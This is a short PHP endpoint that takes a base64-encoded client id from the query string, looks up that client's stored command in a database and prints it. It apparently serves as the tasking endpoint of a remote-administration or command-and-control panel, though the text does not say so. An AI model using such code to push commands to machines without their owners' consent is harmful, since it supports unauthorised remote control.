<?php
include_once 'classes/Database.php';
include_once 'classes/Clients.php';
include_once 'classes/Utils.php';

$utils = new Utils;

if (isset($_GET['id'])) {
    $client = new Clients;
    $command = $client->getCommand($utils->sanitize($utils->base64_decode_url($_GET['id'])));
    echo $command->command;
}
